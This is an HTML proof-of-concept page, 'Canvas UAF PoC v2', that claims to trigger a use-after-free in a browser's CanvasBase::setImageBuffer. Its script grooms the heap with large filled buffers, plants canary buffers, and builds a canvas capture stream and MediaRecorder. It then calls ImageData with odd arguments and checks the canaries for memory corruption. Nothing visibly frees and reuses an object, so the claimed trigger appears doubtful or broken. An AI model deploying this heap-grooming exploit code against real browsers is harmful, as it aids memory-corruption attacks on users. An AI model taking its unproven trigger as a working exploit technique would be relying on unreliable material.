<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Canvas UAF PoC v2</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>Canvas UAF PoC v2</h1>
    <p>Click to trigger UAF in CanvasBase::setImageBuffer.</p>
    <button id="trigger">Trigger UAF</button>
    <canvas id="canvas" width="100" height="100"></canvas>
    <script>
        function setupMemoryCheck() {
            const buffers = [];
            for (let i = 0; i < 50; i++) {
                const buf = new ArrayBuffer(4096); // 4KB
                const view = new Uint8Array(buf);
                view.fill(0x46); // Fill with 0x46
                buffers.push(view);
            }
            return () => {
                let changes = [];
                for (let b = 0; b < buffers.length; b++) {
                    for (let i = 0; i < buffers[b].length; i++) {
                        if (buffers[b][i] !== 0x46) {
                            changes.push(`Buffer[${b}][0x${i.toString(16)}]: 0x${buffers[b][i].toString(16)}`);
                        }
                    }
                }
                return changes.length ? changes.join(', ') : 'No changes';
            };
        }

        document.getElementById('trigger').addEventListener('click', () => {
            alert('Initiating PoC...');
            try {
                // Heap grooming
                alert('Grooming heap with 200x256KB buffers...');
                const groom = [];
                for (let i = 0; i < 200; i++) {
                    const buf = new ArrayBuffer(256 * 1024); // 256KB
                    const view = new Uint8Array(buf);
                    view.fill(0x41);
                    groom.push(view);
                }

                // Initialize memory checker
                const check = setupMemoryCheck();
                alert('Memory checker initialized (50x4KB buffers with 0x46).');

                // Create canvas and capture stream
                alert('Creating canvas and capturing stream...');
                const canvas = document.getElementById('canvas');
                const stream = canvas.captureStream();
                const options = {};
                const recorder = new MediaRecorder(stream, options);

                // Create sensitive objects
                alert('Creating sensitive objects...');
                const textarea = document.createElement('textarea');
                const cols = textarea.cols;
                const imageDataSettings = {};
                setTimeout(() => {
                    try {
                        // Check memory before ImageData
                        const before = check();
                        alert(`Memory before ImageData: ${before}`);

                        // Trigger UAF with ImageData
                        alert('Attempting ImageData creation...');
                        new ImageData(recorder.videoBitsPerSecond || 100, cols, imageDataSettings);

                        // Check memory after
                        const after = check();
                        alert(`Memory after ImageData: ${after}`);
                    } catch (err) {
                        alert(`Error: ${err.message}`);
                    }
                }, 500);
            } catch (err) {
                alert(`Initial error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
